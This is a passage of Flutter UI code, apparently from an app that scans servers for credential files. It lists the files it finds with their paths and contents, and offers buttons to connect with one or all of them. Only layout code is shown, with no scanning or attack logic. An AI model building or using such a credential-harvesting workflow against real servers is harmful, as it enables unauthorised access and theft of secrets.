        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.list, color: AppColors.accent),
              const SizedBox(width: 10),
              Text(
                'HASIL SCAN (${_foundCreds.length})',
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: appFont,
                  letterSpacing: 0.5,
                ),
              ),
              const Spacer(),
              if (_foundCreds.isNotEmpty)
                CyberButton(
                  label: "CONNECT ALL",
                  icon: Icons.link_rounded,
                  onTap: _isConnecting ? () {} : _connectAllCreds,
                  isLoading: _isConnecting,
                  color: AppColors.green,
                ),
            ],
          ),
          const SizedBox(height: 16),
          
          Container(
            height: 250,
            decoration: BoxDecoration(
              color: AppColors.bg.withOpacity(0.5),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: AppColors.border),
            ),
            child: ListView.builder(
              padding: const EdgeInsets.all(8),
              itemCount: _foundCreds.length,
              itemBuilder: (context, index) {
                final creds = _foundCreds[index];
                final isSelected = _selectedCreds == creds;
                
                return Container(
                  margin: const EdgeInsets.only(bottom: 6),
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                  decoration: BoxDecoration(
                    color: isSelected ? AppColors.accent.withOpacity(0.1) : AppColors.surface2.withOpacity(0.3),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                      color: isSelected ? AppColors.accent.withOpacity(0.5) : AppColors.border,
                      width: isSelected ? 1.5 : 1,
                    ),
                  ),
                  child: ListTile(
                    dense: true,
                    leading: Icon(
                      Icons.insert_drive_file,
                      color: isSelected ? AppColors.accent : AppColors.textMuted,
                      size: 18,
                    ),
                    title: Text(
                      creds['server_name'] ?? 'Unknown',
                      style: TextStyle(
                        color: isSelected ? AppColors.textPrimary : AppColors.textSec,
                        fontWeight: FontWeight.w500,
                        fontSize: 13,
                      ),
                    ),
                    subtitle: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          creds['path'] ?? '',
                          style: TextStyle(color: AppColors.textMuted, fontSize: 10),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                    trailing: CyberButton(
                      label: "LINK",
                      icon: Icons.link_rounded,
                      onTap: () => _connectToOtax(creds),
                      color: AppColors.accent,
                    ),
                    onTap: () {
                      setState(() {
                        _selectedCreds = creds;
                        _credsContent = creds['content'] ?? '';
                      });
                    },
                  ),
                );
              },
            ),
          ),
          
          if (_foundCreds.isNotEmpty) ...[
            const SizedBox(height: 12),
            Row(
              children: [
                _buildStatBadge('Total', '${_foundCreds.length}'),
                const SizedBox(width: 8),
                _buildStatBadge('Server', '$_totalServersScanned'),
                const SizedBox(width: 8),
                _buildStatBadge('Found', '${_foundCreds.length}'),
              ],
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildCredsPreview() {
    return GlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.preview, color: AppColors.accent),
              const SizedBox(width: 10),
              Text(
                'PREVIEW CREDS TERPILIH',
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: appFont,
                  letterSpacing: 0.5,
                ),
              ),
              const Spacer(),
              if (_selectedCreds != null)
                Text(
                  _selectedCreds!['server_name'] ?? '',
                  style: TextStyle(color: AppColors.textMuted, fontSize: 10),
                ),
            ],
          ),
          const SizedBox(height: 12),
          
          if (_selectedCreds != null)
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: AppColors.surface2,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppColors.border),
              ),
              child: Row(
                children: [
                  Icon(Icons.computer, color: AppColors.accent.withOpacity(0.6), size: 18),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          _selectedCreds!['server_name'] ?? 'Unknown',
                          style: TextStyle(
                            color: AppColors.textPrimary,
                            fontWeight: FontWeight.w500,
                            fontSize: 13,
                          ),
                        ),
                        Text(
                          _selectedCreds!['path'] ?? '',
                          style: TextStyle(color: AppColors.textMuted, fontSize: 10),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          
          const SizedBox(height: 12),
          Container(
            height: 160,
            decoration: BoxDecoration(
              color: AppColors.bg,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: AppColors.border),
            ),
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(12),
              child: SelectableText(
                _credsContent.length > 1000 
                    ? '${_credsContent.substring(0, 1000)}...' 
                    : _credsContent,
                style: TextStyle(
                  color: AppColors.textMuted,
                  fontSize: 11,
                ),
              ),
            ),
          ),
          const SizedBox(height: 12),
          CyberButton(
            label: "CONNECT SELECTED",
            icon: Icons.link_rounded,
            onTap: _isConnecting ? () {} : _connectSelectedCreds,
            isLoading: _isConnecting,
            width: double.infinity,
          ),
        ],
      ),
    );
  }

  Widget _buildStatBadge(String label, String value) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: AppColors.surface2,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: AppColors.border),
      ),
      child: RichText(
        text: TextSpan(
          children: [
            TextSpan(
              text: '$label  ',
              style: TextStyle(
                color: AppColors.textMuted,
                fontSize: 10,
              ),
            ),
            TextSpan(
              text: value,
              style: TextStyle(
                color: AppColors.accent,
                fontSize: 11,
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      ),
    );
  }
}